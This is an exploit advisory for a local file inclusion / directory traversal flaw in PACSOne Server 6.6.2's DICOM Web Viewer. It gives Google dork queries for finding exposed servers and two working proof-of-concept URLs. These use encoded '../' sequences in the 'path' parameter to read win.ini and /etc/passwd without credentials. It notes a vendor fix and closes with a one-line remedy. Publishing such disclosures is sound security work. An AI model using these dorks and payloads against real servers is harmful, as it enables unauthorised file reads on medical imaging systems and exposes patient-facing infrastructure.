@@ -1,0 +1,32 @@
+# Exploit Title: PACSOne Server 6.6.2 DICOM Web Viewer Directory Trasversal / Local File Inclusion
+# Date: 08/14/2017
+# Software Link: http://www.pacsone.net/download.htm
+# Google Dork: inurl:pacs/login.php	inurl:pacsone/login.php		inurl:pacsone filetype:php home		inurl:pacsone filetype:php login
+# Version: PACSOne Server 6.6.2
+# Category: webapps
+# Tested on: Windows 7 / Debian Linux
+# Exploit Author: Carlos Avila
+# Contact: http://twitter.com/badboy_nt
+
+
+
+1. Description
+  
+DICOM Web Viewer is a component written in PHP that is part of PacsOne software. In version 6.6.2, it is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required.
+The 'path' parameter via GET is vulnerable.
+
+Found: 08/14/2017
+Vendor Reply & Fix: 09/28/2017
+
+  
+2. Proof of Concept
+
+
+http://localhost/pacs/nocache.php?path=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+
+http://localhost/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
+
+
+3. Solution:
+
+Application inputs must be validated correctly.
